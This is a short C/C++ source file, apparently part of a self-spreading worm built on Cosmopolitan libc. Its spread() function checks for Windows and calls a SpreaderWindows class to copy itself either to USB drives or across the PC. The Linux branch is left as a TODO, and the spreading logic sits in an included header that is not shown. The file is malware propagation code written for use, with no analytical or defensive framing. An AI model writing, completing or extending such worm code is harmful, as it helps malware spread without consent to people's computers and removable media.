#include <cosmo.h>
#include <libc/dce.h>
#include "spreader-windows.h"

void spread() {
  if (IsWindows()) {
    SpreaderWindows s;
    if (s.shouldSpreadToUsb()) {
      s.spreadToUsb();
    } else {
      s.spreadToPc();
    }
  } else if (IsLinux()) {
    // TODO
  }
}